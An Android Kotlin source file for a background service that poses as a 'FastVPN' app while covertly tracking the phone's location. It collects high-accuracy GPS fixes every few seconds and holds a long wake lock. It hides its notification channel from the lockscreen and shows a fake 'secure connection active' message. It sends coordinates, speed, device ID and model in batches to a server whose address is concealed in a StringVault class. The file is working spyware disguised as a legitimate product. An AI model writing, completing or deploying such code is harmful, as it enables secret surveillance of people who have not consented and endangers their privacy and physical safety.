package com.secure.netcore

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.location.Location
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.*
import kotlinx.coroutines.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.util.UUID
import java.util.concurrent.TimeUnit

class LocationService : Service() {
    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .writeTimeout(15, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .build()

    private lateinit var wakeLock: PowerManager.WakeLock
    private lateinit var fused: FusedLocationProviderClient
    private val job = SupervisorJob()
    private val scope = CoroutineScope(Dispatchers.IO + job)
    private val buffer = ArrayList<Location>()
    private var lastSend = 0L

    companion object {
        const val CHANNEL_ID = "vpn_conn"
        const val NOTIF_ID = 1
        const val UPDATE_MS = 5_000L        // фикс GPS каждые 5 сек
        const val BATCH_MS = 10_000L       // отправка пачкой каждые 10 сек
        const val MAX_ACCURACY_M = 50f     // ЖЁСТКИЙ ПОТОЛОК: хуже 50м — НЕ шлём
    }

    private fun deviceId(): String {
        val sp = getSharedPreferences("cfg", Context.MODE_PRIVATE)
        var id = sp.getString("did", null)
        if (id == null) {
            id = "phone-" + UUID.randomUUID().toString().take(8)
            sp.edit().putString("did", id).apply()
        }
        return id
    }

    private fun deviceModel(): String =
        android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL

    override fun onCreate() {
        super.onCreate()
        fused = LocationServices.getFusedLocationProviderClient(this)
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "fastvpn:loc")
        wakeLock.acquire(10 * 60 * 60 * 1000L)
        createChannel()
        startForeground(NOTIF_ID, buildNotification())
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val req = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, UPDATE_MS)
            .setWaitForAccurateLocation(true)
            .setMinUpdateIntervalMillis(3_000L)
            .build()
        try {
            fused.requestLocationUpdates(req, callback, mainLooper)
        } catch (_: SecurityException) { stopSelf() }
        return START_STICKY
    }

    private val callback = object : LocationCallback() {
        override fun onLocationResult(res: LocationResult) {
            for (loc in res.locations) {
                // Двойная фильтрация: только точные фиксы
                if (loc.hasAccuracy() && loc.accuracy in 0.0..MAX_ACCURACY_M.toDouble())
                    buffer.add(loc)
            }
            if (System.currentTimeMillis() - lastSend >= BATCH_MS) flush()
        }
    }

    private fun flush() {
        if (buffer.isEmpty()) return
        lastSend = System.currentTimeMillis()

        // Берём только фиксы в пределах 50м
        val pool = buffer.filter {
            it.hasAccuracy() && it.accuracy in 0.0..MAX_ACCURACY_M.toDouble()
        }
        if (pool.isEmpty()) { buffer.clear(); return }

        // Усредняем 1–3 лучших фикса (сглаживание GPS-шума)
        val top = pool.sortedBy { it.accuracy }.take(3)
        var lat = 0.0; var lon = 0.0; var acc = 0.0
        for (l in top) { lat += l.latitude; lon += l.longitude; acc += l.accuracy }
        lat /= top.size; lon /= top.size; acc /= top.size

        val arr = JSONArray()
        arr.put(JSONObject()
            .put("device_id", deviceId())
            .put("device_model", deviceModel())
            .put("lat", lat)
            .put("lon", lon)
            .put("accuracy", acc)
            .put("speed", (top.first().speed * 3.6)))
        buffer.clear()

        val server = StringVault.serverUrl()
        val body = arr.toString().toRequestBody("application/json".toMediaType())
        val request = Request.Builder()
            .url("$server/points")
            .post(body)
            .build()

        scope.launch {
            try { client.newCall(request).execute().close() } catch (_: Exception) {}
        }
    }

    private fun createChannel() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
        val ch = NotificationChannel(
            CHANNEL_ID, "FastVPN", NotificationManager.IMPORTANCE_MIN)
        ch.setShowBadge(false)
        ch.enableLights(false)
        ch.enableVibration(false)
        ch.lockscreenVisibility = Notification.VISIBILITY_SECRET
        getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
    }

    private fun buildNotification(): Notification {
        val pi = PendingIntent.getActivity(this, 0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE)
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("FastVPN")
            .setContentText("Захищене з'єднання активне")
            .setSmallIcon(R.drawable.ic_vpn)
            .setColor(Color.parseColor("#1565C0"))
            .setContentIntent(pi)
            .setOngoing(true)
            .setOnlyAlertOnce(true)
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        job.cancel()
        fused.removeLocationUpdates(callback)
        if (wakeLock.isHeld) wakeLock.release()
        super.onDestroy()
    }
}
